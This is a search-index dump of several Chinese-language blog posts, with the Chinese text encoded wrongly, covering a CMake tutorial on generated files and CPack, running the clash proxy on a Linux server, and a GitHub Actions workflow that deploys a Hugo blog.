é™¤äº†åœ¨TutorialConfig.hä¸­ä¿å­˜HAVE_LOGå’ŒHAVE_EXPå€¼ï¼Œæˆ‘ä»¬è¿˜æœ‰æ›´å¥½çš„æ–¹æ³•å—ï¼Ÿè®©æˆ‘ä»¬å°è¯•ä½¿ç”¨target_compile_definitions()ã€‚ é¦–å…ˆï¼Œä»TutorialConfig.h.inä¸­åˆ é™¤å®šä¹‰ã€‚æˆ‘ä»¬ä¸å†éœ€è¦åœ¨mysqrt.cxxä¸­ include TutorialConfig.hæˆ–MathFunctions/CMakeLists.txtä¸­çš„å…¶ä»– include å†…å®¹ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†HAVE_LOGå’ŒHAVE_EXPçš„æ£€æŸ¥ç§»è‡³MathFunctions/CMakeLists.txtï¼Œç„¶åå°†è¿™äº›å€¼æŒ‡å®šä¸ºPRIVATEç¼–è¯‘å®šä¹‰ã€‚ include(CheckSymbolExists)check_symbol_exists(log \"math.h\" HAVE_LOG)check_symbol_exists(exp \"math.h\" HAVE_EXP)if(NOT (HAVE_LOG AND HAVE_EXP)) unset(HAVE_LOG CACHE) unset(HAVE_EXP CACHE) set(CMAKE_REQUIRED_LIBRARIES \"m\") check_symbol_exists(log \"math.h\" HAVE_LOG) check_symbol_exists(exp \"math.h\" HAVE_EXP) if(HAVE_LOG AND HAVE_EXP) target_link_libraries(MathFunctions PRIVATE m) endif()endif()# add compile definitions if(HAVE_LOG AND HAVE_EXP) target_compile_definitions(MathFunctions PRIVATE \"HAVE_LOG\" \"HAVE_EXP\")endif() ä¹‹åå†é‡æ–°æ„å»ºå¹¶è¿è¡Œé¡¹ç›®ï¼ŒæŸ¥çœ‹ç»“æœã€‚ æ·»åŠ è‡ªå®šä¹‰å‘½ä»¤å’Œç”Ÿæˆçš„æ–‡ä»¶ å‡è®¾ï¼Œä½œä¸ºæœ¬æ•™ç¨‹çš„ç›®çš„ï¼Œæˆ‘ä»¬å†³å®šæ°¸è¿œä¸è¦ä½¿ç”¨å¹³å°æä¾›çš„logå’Œexpå‡½æ•°ï¼Œè€Œæ˜¯æƒ³ç”Ÿæˆä¸€ä¸ªé¢„è®¡ç®—å€¼çš„è¡¨ï¼Œä»¥ä¾¿åœ¨mysqrtå‡½æ•°ä¸­ä½¿ç”¨ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºè¯¥è¡¨ä½œä¸ºæ„å»ºè¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åå°†è¯¥è¡¨ç¼–è¯‘åˆ°æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ é™¤MathFunctions/CMakeLists.txtä¸­å¯¹logå’Œexpå‡½æ•°çš„æ£€æŸ¥ã€‚ç„¶åä»mysqrt.cxxä¸­åˆ é™¤å¯¹HAVE_LOGå’ŒHAVE_EXPçš„æ£€æŸ¥ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ é™¤#include ã€‚ åœ¨MathFunctionså­ç›®å½•ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªåä¸ºMakeTable.cxxçš„æ–°æºæ–‡ä»¶æ¥ç”Ÿæˆè¡¨ã€‚ æŸ¥çœ‹å®Œæ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥è¡¨æ˜¯ä½œä¸ºæœ‰æ•ˆçš„ C ++ä»£ç ç”Ÿæˆçš„ï¼Œå¹¶ä¸”è¾“å‡ºæ–‡ä»¶åä½œä¸ºå‚æ•°ä¼ å…¥ã€‚ // A simple program that builds a sqrt table #include \u003ccmath\u003e#include \u003cfstream\u003e#include \u003ciostream\u003e int main(int argc, char *argv[]) { // make sure we have enough arguments if (argc \u003c 2) { return 1; } std::ofstream fout(argv[1], std::ios_base::out); const bool fileOpen = fout.is_open(); if (fileOpen) { fout \u003c\u003c \"double sqrtTable[] = {\" \u003c\u003c std::endl; for (int i = 0; i \u003c 10; ++i) { fout \u003c\u003c sqrt(static_cast\u003cdouble\u003e(i)) \u003c\u003c \",\" \u003c\u003c std::endl; } // close the table with a zero fout \u003c\u003c \"0};\" \u003c\u003c std::endl; fout.close(); } return fileOpen ? 0 : 1; // return 0 if wrote the file } ä¸‹ä¸€æ­¥æ˜¯å°†é€‚å½“çš„å‘½ä»¤æ·»åŠ åˆ°MathFunctions/CMakeLists.txtæ–‡ä»¶ä¸­ï¼Œä»¥æ„å»ºMakeTableå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶ååœ¨æ„å»ºè¿‡ç¨‹ä¸­è¿è¡Œå®ƒã€‚éœ€è¦ä¸€äº›å‘½ä»¤æ¥å®Œæˆæ­¤æ“ä½œã€‚ é¦–å…ˆï¼Œåœ¨MathFunctions/CMakeLists.txtçš„é¡¶éƒ¨ï¼Œæ·»åŠ MakeTableçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±åƒæ·»åŠ ä»»ä½•å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶ä¸€æ ·ã€‚ add_executable(MakeTable MakeTable.cxx) ç„¶åï¼Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æŒ‡å®šå¦‚ä½•é€šè¿‡è¿è¡ŒMakeTableæ¥äº§ç”ŸTable.hã€‚ add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¿…é¡»è®© CMake çŸ¥é“mysqrt.cxxå¦‚ä½•ä¾èµ–ç”Ÿæˆçš„æ–‡ä»¶Table.hã€‚é€šè¿‡å°†ç”Ÿæˆçš„Table.hæ·»åŠ åˆ°åº“MathFunctionsçš„æºåˆ—è¡¨ä¸­ï¼Œå¯ä»¥å®Œæˆæ­¤æ“ä½œã€‚ add_library(MathFunctions mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) æˆ‘ä»¬è¿˜å¿…é¡»å°†å½“å‰çš„äºŒè¿›åˆ¶ç›®å½•æ·»åŠ åˆ°åŒ…å«ç›®å½•åˆ—è¡¨ä¸­ï¼Œä»¥ä¾¿mysqrt.cxxå¯ä»¥æ‰¾åˆ°å¹¶åŒ…å«Table.hã€‚ target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ç”Ÿæˆçš„è¡¨ã€‚é¦–å…ˆï¼Œä¿®æ”¹mysqrt.cxxä»¥åŒ…å«Table.hã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é‡å†™mysqrtå‡½æ•°ä»¥ä½¿ç”¨è¯¥è¡¨ï¼š #include \u003ciostream\u003e#include \"MathFunctions.h\"#include \"Table.h\" double mysqrt(double x) { if (x \u003c= 0) { return 0; } // use the table to help find an initial value double result = x; if (x \u003e= 1 \u0026\u0026 x \u003c 10) { std::cout \u003c\u003c \"Use the table to help find an initial value \" \u003c\u003c std::endl; result = sqrtTable[static_cast\u003cint\u003e(x)]; } // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } æ„å»ºæ­¤é¡¹ç›®æ—¶ï¼Œå®ƒå°†é¦–å…ˆæ„å»ºMakeTableå¯æ‰§è¡Œæ–‡ä»¶ã€‚ç„¶åå®ƒå°†è¿è¡ŒMakeTableç”ŸæˆTable.hã€‚æœ€åï¼Œå®ƒå°†ç¼–è¯‘åŒ…æ‹¬Table.hçš„mysqrt.cxxï¼Œä»¥ç”ŸæˆMathFunctionsåº“ã€‚ åšå®Œè¿™äº›æ›´æ–°åï¼Œå†ç»§ç»­æ„å»ºé¡¹ç›®ã€‚è¿è¡Œæ„å»ºå¥½çš„ Tutorial å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éªŒè¯ç»“æœæ˜¯å¦ä¸å‰é¢ç›¸åŒã€‚ æ„å»ºå®‰è£…ç¨‹åº æ¥ä¸‹æ¥å‡è®¾æˆ‘ä»¬æƒ³æŠŠæˆ‘ä»¬çš„é¡¹ç›®å‘å¸ƒç»™å…¶ä»–äººï¼Œä»¥ä¾¿ä»–ä»¬èƒ½å¤Ÿä½¿ç”¨å®ƒã€‚æˆ‘ä»¬å¸Œæœ›åœ¨ä¸åŒçš„å¹³å°ä¸Šæä¾›äºŒè¿›åˆ¶å’Œæºä»£ç çš„å‘å¸ƒã€‚è¿™ä¸æˆ‘ä»¬ä¹‹å‰åœ¨å®‰è£…å’Œæµ‹è¯•ï¼ˆç¬¬ 4 æ­¥ï¼‰ä¸­æ‰€åšçš„å®‰è£…æœ‰äº›ä¸åŒï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å®‰è£…çš„æ˜¯æˆ‘ä»¬ä»æºä»£ç ä¸­æ„å»ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æ„å»ºæ”¯æŒäºŒè¿›åˆ¶å®‰è£…å’ŒåŒ…ç®¡ç†åŠŸèƒ½çš„å®‰è£…åŒ…ã€‚ä¸ºäº†å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨CPackæ¥åˆ›å»ºç‰¹å®šå¹³å°çš„å®‰è£…åŒ…ã€‚å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é¡¶å±‚CMakeLists.txtæ–‡ä»¶çš„åº•éƒ¨æ·»åŠ å‡ è¡Œå†…å®¹: include(InstallRequiredSystemLibraries)set(CPACK_RESOURCE_FILE_LICENSE \"${CMAKE_CURRENT_SOURCE_DIR}/License.txt\")set(CPACK_PACKAGE_VERSION_MAJOR \"${Tutorial_VERSION_MAJOR}\")set(CPACK_PACKAGE_VERSION_MINOR \"${Tutorial_VERSION_MINOR}\")include(CPack) é¦–å…ˆåŒ…å«InstallRequiredSystemLibrariesã€‚è¿™ä¸ªæ¨¡å—å°†åŒ…å«é¡¹ç›®åœ¨å½“å‰å¹³å°ä¸Šéœ€è¦çš„ä»»ä½•è¿è¡Œæ—¶åº“ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€äº›CPackå˜é‡ï¼Œå°†è¿™ä¸ªé¡¹ç›®çš„è®¸å¯è¯å’Œç‰ˆæœ¬ä¿¡æ¯å­˜å‚¨åœ¨é‚£é‡Œã€‚ç‰ˆæœ¬ä¿¡æ¯åœ¨æœ¬æ•™ç¨‹çš„å‰é¢å·²ç»è®¾ç½®å¥½äº†ï¼Œlicense.txtå·²ç»åŒ…å«åœ¨æœ¬æ­¥éª¤çš„é¡¶å±‚æºç›®å½•ä¸­: This is the open source License.txt file introduced in CMake/Tutorial/Step7... æœ€åæˆ‘ä»¬åŠ å…¥CPackæ¨¡å—ï¼Œå®ƒå°†ä½¿ç”¨è¿™äº›å˜é‡å’Œå½“å‰ç³»ç»Ÿçš„ä¸€äº›å…¶ä»–å±æ€§æ¥è®¾ç½®å®‰è£…ç¨‹åºã€‚ ä¸‹ä¸€æ­¥æ˜¯ä»¥é€šå¸¸çš„æ–¹å¼æ„å»ºé¡¹","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:6:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["Linux"],"content":"èµ·å›  å¶ç„¶å‘ç°ç™¾åº¦äº‘çš„å­¦ç”ŸæœåŠ¡å™¨æŒºä¾¿å®œï¼Œ2 æ ¸å¿ƒ 4g å†…å­˜æœºå‹ä¸€ä¸ªæœˆåªè¦ 18 å…ƒï¼Œæœ‰ä¸ªéšæ—¶éšåœ°èƒ½å¤Ÿè®¿é—®çš„ Linux ç¯å¢ƒè¿˜æ˜¯æŒºå¥½çš„ï¼Œé‚è´­å…¥ã€‚æ–°ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆï¼Œç¬¬ä¸€ä»¶äº‹å½“ç„¶æ˜¯æ¥ä¸€å¥—ohmyzshï¼Œç»“æœè¿™å°±å‡ºäº†é—®é¢˜ï¼Œgit cloneå¤ªæ…¢äº†ã€‚ é‚æƒ³åˆ°æ˜¯ä¸æ˜¯è¯¥ç»™å…¶ä½¿ç”¨ä¸€ä¸‹ä»£ç†ã€‚ä¸ç„¶ä¹‹åä¸æ­¢git cloneï¼Œå¾ˆå¤šèµ„æºéƒ½æ— æ³•ä¸‹è½½ã€‚ ä½¿ç”¨clash clashæ˜¯ä¸€æ¬¾ä½¿ç”¨goè¯­è¨€å¼€å‘çš„å¤šå¹³å°ä»£ç†å·¥å…·ï¼Œæ”¯æŒss/v2rayç­‰å¤šç§åè®®ï¼Œåœ¨macOSï¼Œwindowsä¸Šä½¿ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œåœ¨æ²¡æœ‰GUIçš„Linuxä¹Ÿåªéœ€è¦ç¨åŠ é…ç½®ã€‚ å…ˆä»è¿™é‡Œä¸‹è½½clashçš„linux-amd64å¯æ‰§è¡Œæ–‡ä»¶ã€‚ naruto@bdy:~$ gzip -d clash-linux-amd64-v1.1.0.gz naruto@bdy:~$ chmod +x clash-linux-amd64-v1.1.0 naruto@bdy:~$ sudo mv clash-linux-amd64-v1.1.0 /usr/local/bin/clash ç„¶åä¸‹è½½Country.mmdbã€‚ naruto@bdy:~$ mkdir -p .config/clash naruto@bdy:~$ mv Country.mmdb .config/clash/ ä¹‹åï¼Œéœ€è¦æœ€å…³é”®çš„clashä»£ç†é…ç½®æ–‡ä»¶config.yamlï¼Œä¸€èˆ¬æœºåœºéƒ½ä¼šæä¾›ï¼ŒåŒæ ·å°†å…¶æ”¾åˆ°.config/clashç›®å½•ä¸‹ã€‚ ä¹‹åå…ˆç›´æ¥å¯åŠ¨clashçœ‹çœ‹æ•ˆæœã€‚ å¯åŠ¨é‡åˆ°WARN[0000] Failed to start Redir UDP Listener: operation not permittedï¼Œå¯ä»¥ä½¿ç”¨sudo clashå¯åŠ¨ã€‚ é…ç½® GUI ç•Œé¢ ä»ä¸Šä¸€æ®µçš„å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒclashæœåŠ¡æœ‰ä¸€ä¸ªRESTful APIçš„æœåŠ¡ï¼Œé€šè¿‡å…¶æˆ‘ä»¬å¯ä»¥è®¿é—® web ç®¡ç†é¡µé¢ã€‚åœ¨config.yamlä¸­åˆ¶å®šå³å¯ã€‚æ¯”è¾ƒå—æ¬¢è¿çš„æ˜¯yacdï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½æ‰“åŒ…å¥½çš„ç‰ˆæœ¬ã€‚ naruto@bdy:~$ unzip yacd-gh-pages.zip naruto@bdy:~$ mv yacd-gh-pages .config/clash/dashboard åœ¨config.yamlä¸­å¦‚ä¸‹è®¾ç½®ï¼š external-ui:\"dashboard\"secret:\"\" å¯åŠ¨clashåï¼Œæµè§ˆå™¨ä½¿ç”¨ip:port/uiçš„æ–¹å¼è®¿é—®ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ äº«ç”¨ä»£ç† åœ¨ GUI ç•Œé¢é€‰æ‹©å¥½ä»£ç†æœåŠ¡å™¨åï¼Œå°±å¯ä»¥ä½¿ç”¨ä»£ç†äº†ã€‚æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯çª—å£ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œè®¾ç½®http(s)ä»£ç†ç¯å¢ƒå˜é‡ã€‚ export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 æ¥ä¸‹æ¥ï¼Œè¿›è¡Œä¸€äº›å®Œå–„å·¥ä½œã€‚é¦–å…ˆæ¯æ¬¡éƒ½æ‰‹åŠ¨å¯åŠ¨clashå¹¶ä¸”å ç”¨ä¸€ä¸ªç»ˆç«¯çª—å£æ˜¯å¾ˆä¸æ–¹ä¾¿çš„ï¼Œå…ˆå°†clashä½œä¸ºä¸€ä¸ªdaemonè¿›ç¨‹ã€‚å‚ç…§å¼€å‘è€…æ¨èï¼Œä½¿ç”¨pm2ã€‚ $ npm install -g nrm $ pm2 start clash ç„¶åæ˜¯å°†ä»£ç†å‘½ä»¤ä½œä¸ºå‡½æ•°å†™å…¥.zshrc. æ³¨æ„ï¼Œä¸‹é¢ä½¿ç”¨äº†zshè¯­æ³•ï¼Œå’Œbashç•¥æœ‰ä¸åŒã€‚ PROXY_IP=127.0.0.1 PROXY_PORT=7890 function Proxy() { if [ \"$1\" = \"on\" ]; then export https_proxy=$PROXY_IP:$PROXY_PORT export http_proxy=$PROXY_IP:$PROXY_PORT echo Proxy On else unset https_proxy unset http_proxy echo Proxy Off fi } ç„¶åè¯•è¯•çœ‹ï¼Œéå¸¸æ„‰å¿«ã€‚ æœ€åï¼Œæˆ‘ä»¬æ¥è£…ä¸€ä¸ªrustè¯•è¯•ã€‚ ","date":"2020-08-21","objectID":"/posts/linux-clash-proxy/:0:0","tags":["clash","ä»£ç†"],"title":"Linuxä½¿ç”¨clashä»£ç†","uri":"/posts/linux-clash-proxy/"},{"categories":["github"],"content":"ç®€ä»‹ GitHub Actionså¯å¸®åŠ©å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸå†…è‡ªåŠ¨åŒ–ä»»åŠ¡ã€‚ GitHub Actions æ˜¯äº‹ä»¶é©±åŠ¨çš„ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨å‘ç”ŸæŒ‡å®šäº‹ä»¶åè¿è¡Œä¸€ç³»åˆ—å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œæ¯å½“æœ‰äººä¸ºä»“åº“æ–°å»ºpræ—¶ï¼Œå¯ä»¥è‡ªåŠ¨è¿è¡Œæµ‹è¯•è„šæœ¬ã€‚ è¯¥å›¾æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨ GitHub Actions è‡ªåŠ¨è¿è¡Œè½¯ä»¶æµ‹è¯•è„šæœ¬ã€‚äº‹ä»¶è‡ªåŠ¨è§¦å‘åŒ…jobå«çš„workflowã€‚ç„¶åï¼Œjobå°†ä½¿ç”¨stepæ¥æ§åˆ¶actionçš„æ‰§è¡Œé¡ºåºã€‚è¿™äº›actionå³æ˜¯è‡ªåŠ¨åŒ–æµ‹è¯•è½¯ä»¶çš„å‘½ä»¤ã€‚ Github Actions çš„ç»„ä»¶ ä»¥ä¸‹æ˜¯å¯ååŒè¿è¡Œjobçš„å¤šä¸ªGitHub Actionsç»„ä»¶çš„åˆ—è¡¨ã€‚å¯ä»¥çœ‹åˆ°è¿™äº›ç»„ä»¶ä¹‹é—´å¦‚ä½•äº¤äº’ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:0:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"workflow workflowæ‚¨æ·»åŠ åˆ°ä»£ç ä»“åº“ä¸­çš„è‡ªåŠ¨åŒ–è¿‡ç¨‹ã€‚å…¶ç”±ä¸€ä¸ªæˆ–å¤šä¸ªjobç»„æˆï¼Œå¯ä»¥ç”±äº‹ä»¶è°ƒåº¦æˆ–è§¦å‘ã€‚è¯¥workflowå¯ç”¨äºåœ¨ GitHub ä¸Šæ„å»ºï¼Œæµ‹è¯•ï¼Œæ‰“åŒ…ï¼Œå‘å¸ƒæˆ–éƒ¨ç½²é¡¹ç›®ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:1:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Events eventæ˜¯è§¦å‘workflowçš„ç‰¹å®šæ´»åŠ¨ã€‚ä¾‹å¦‚ï¼Œå½“æœ‰äººå°†commit æ¨é€åˆ°ä»“åº“æˆ–åˆ›å»ºissueæˆ–præ—¶ï¼ŒGithub ä¼šäº§ç”Ÿenventã€‚è¿˜å¯ä»¥ä½¿ç”¨ repository dispatch webhookåœ¨å‘ç”Ÿå¤–éƒ¨äº‹ä»¶æ—¶è§¦å‘workflowã€‚æœ‰å…³å¯ç”¨äºè§¦å‘workflowçš„evrntçš„å®Œæ•´åˆ—è¡¨ï¼ŒæŸ¥çœ‹Events that trigger workflowsã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Jobs jobæ˜¯åœ¨åŒä¸€runnerä¸Šæ‰§è¡Œçš„ä¸€ç»„stepã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå…·æœ‰å¤šä¸ªjobçš„workflowç¨‹å°†å¹¶è¡Œè¿è¡Œè¿™äº›jobã€‚è¿˜å¯ä»¥é…ç½®workflowä»¥æŒ‰é¡ºåºè¿è¡Œjobã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªworkflowå¯ä»¥æœ‰ä¸¤ä¸ªé¡ºåºæ‰§è¡Œçš„jobæ¥æ„å»ºå’Œæµ‹è¯•ä»£ç ï¼Œå…¶ä¸­æµ‹è¯•jobå–å†³äºæ„å»ºjobçš„çŠ¶æ€ã€‚å¦‚æœæ„å»ºjobå¤±è´¥ï¼Œåˆ™æµ‹è¯•jobå°†ä¸ä¼šè¿è¡Œã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Steps stepæ˜¯å¯ä»¥åœ¨jobä¸­è¿è¡Œå‘½ä»¤çš„å•ä¸ªä»»åŠ¡ã€‚stepå¯ä»¥æ˜¯æ“ä½œæˆ–shellå‘½ä»¤ã€‚jobä¸­çš„æ¯ä¸ªstepéƒ½åœ¨åŒä¸€runnerä¸Šæ‰§è¡Œï¼Œä»è€Œä½¿è¯¥jobä¸­çš„æ“ä½œå¯ä»¥å½¼æ­¤å…±äº«æ•°æ®ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:4:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Actions actionæ˜¯ç‹¬ç«‹çš„å‘½ä»¤ï¼Œç»„åˆæˆstepä»¥æ„å»ºjob, actionæ˜¯å·¥ä½œæµä¸­æœ€å°çš„å¯ç§»æ¤æ„å»ºå—ã€‚å¯ä»¥åˆ›å»ºè‡ªå·±çš„actionï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ GitHub ç¤¾åŒºåˆ›å»ºçš„actionã€‚è¦åœ¨å·¥ä½œæµä¸­ä½¿ç”¨actionï¼Œå¿…é¡»å°†å…¶åŒ…æ‹¬åœ¨ä¸€ä¸ªstepä¸­ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:5:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"Runners runneræ˜¯å·²å®‰è£…GitHub Actions runner åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ã€‚å¯ä»¥ä½¿ç”¨ GitHub æ‰˜ç®¡çš„runnerï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±çš„runnerã€‚runnerç›‘å¬å¯ç”¨çš„jobï¼Œä¸€æ¬¡è¿è¡Œä¸€ä¸ªjobï¼Œå¹¶å°†è¿›åº¦ï¼Œæ—¥å¿—å’Œç»“æœåé¦ˆç»™ GitHubã€‚å¯¹äºç”± GitHub æ‰˜ç®¡çš„runnerï¼Œworkflowä¸­çš„æ¯ä¸ªjobéƒ½åœ¨å…¨æ–°çš„è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œã€‚ GitHub æ‰˜ç®¡çš„runneråŸºäº Ubuntu Linuxï¼ŒMicrosoft Windows å’Œ macOSã€‚æœ‰å…³ GitHub æ‰˜ç®¡çš„runnerçš„ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Virtual environments for GitHub-hosted runners\"ã€‚å¦‚æœéœ€è¦å…¶ä»–çš„ OS æˆ–ç‰¹å®šçš„ç¡¬ä»¶é…ç½®ï¼Œåˆ™å¯ä»¥æ‰˜ç®¡è‡ªå·±çš„runnerã€‚æœ‰å…³è‡ªæ‰˜ç®¡runnerçš„ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Hosting your own runners\"ã€‚ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:6:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"åˆ›å»ºæ ·ä¾‹ workflow GitHub Actions ä½¿ç”¨YAMLè¯­æ³•å®šä¹‰eventï¼Œjobå’Œstepã€‚è¿™äº› YAML æ–‡ä»¶å­˜å‚¨åœ¨ä»£ç å­˜å‚¨åº“ä¸­çš„.github / workflowsç›®å½•ä¸­ã€‚ å¯ä»¥åœ¨ä»“åº“ä¸­åˆ›å»ºç¤ºä¾‹çš„workflowï¼Œè¯¥workflowåœ¨æ¯æ¬¡æ¨é€ä»£ç æ—¶è‡ªåŠ¨è§¦å‘ä¸€ç³»åˆ—å‘½ä»¤ã€‚åœ¨æ­¤workflowä¸­ï¼ŒGitHub Actions ä½¿ç”¨äº†actions marketçš„checkoutå’Œsetup-node actionï¼Œç„¶åå®‰è£…è½¯ä»¶ä¾èµ–é¡¹ï¼Œå¹¶è¿è¡Œbat -vã€‚ é¦–å…ˆåœ¨é¡¹ç›®ä¸­åˆ›å»º.github/workflowç›®å½• åœ¨å…¶ä¸­ï¼Œåˆ›å»ºä¸€ä¸ªlearn-github-actions.ymlæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š name:learn-github-actionson:[push]jobs:check-bats-version:runs-on:ubuntu-lateststeps:- uses:actions/checkout@v2- uses:actions/setup-node@v1- run:npm install -g bats- run:bats -v commitè¿™äº›ä¿®æ”¹å¹¶ä¸”pushä»£ç åˆ°ä»“åº“ ç°åœ¨ï¼Œæ–°çš„GitHub Actionså·¥ä½œæµæ–‡ä»¶å·²å®‰è£…åœ¨ä»£ç ä»“åº“ä¸­ï¼Œå¹¶ä¸”æ¯æ¬¡æœ‰äººå°†æ›´æ”¹æ¨é€åˆ°ä»“åº“æ—¶ï¼Œå®ƒå°†è‡ªåŠ¨è¿è¡Œã€‚æœ‰å…³ä½œä¸šçš„æ‰§è¡Œå†å²è®°å½•çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…\"Viewing the workflowâ€™s activity\"ã€‚ è¦æ›´è¯¦ç»†äº†è§£workflowæ–‡ä»¶ï¼Œå‚é˜…Understanding the workflow fileã€‚ è‡ªåŠ¨æ„å»º Hugo åšå®¢ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:7:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"é…ç½®å¯†é’¥ é¦–å…ˆç”Ÿæˆä¸€å¯¹æ–°çš„å¯†é’¥ ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f github-deploy-key -N \"\" åœ¨å¯¹åº”çš„ gihtub ä»“åº“è®¾ç½®ä¸­çš„Deploy keys,å°†åˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ä¸­çš„å…¬é’¥æ·»åŠ è¿›å»;ç„¶ååœ¨è®¾ç½®ä¸­çš„Secretsé‡Œé¢æ–°å»ºä¸€ä¸ªSecretï¼Œåä¸ºDEPLOY_KEYï¼Œå°†åˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ä¸­çš„ç§é’¥æ·»åŠ è¿›å». ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:8:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"é…ç½®workflow åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º.github/workflow/gh-pages.yamlï¼Œå†…å®¹ä¸º name:Build GH-Pageson:push:branches:- hugoworkflow_dispatch:# manual runjobs:deploy:runs-on:ubuntu-lateststeps:- name:Git checkoutuses:actions/checkout@v2with:ref:hugo- name:Get Themerun:git submodule update --init --recursive- name:Update theme to Latest commitrun:git submodule update --remote --merge- uses:actions/cache@v2with:path:/tmp/hugo_cachekey:${{ runner.os }}-hugomod-${{ hashFiles('**/go.sum') }}restore-keys:|${{ runner.os }}-hugomod-- name:Buildrun:hugo --buildDrafts --gc --verbose --minify- name:Setup hugouses:peaceiris/actions-hugo@v2with:hugo-version:\"latest\"- name:Deployuses:peaceiris/actions-gh-pages@v3with:github_token:${{ secrets.DEPLOY_KEY }}publish_dir:./public ä¸è¿‡éƒ¨ç½² Hexo åšå®¢çš„è¯,ç›®å‰ Vercel 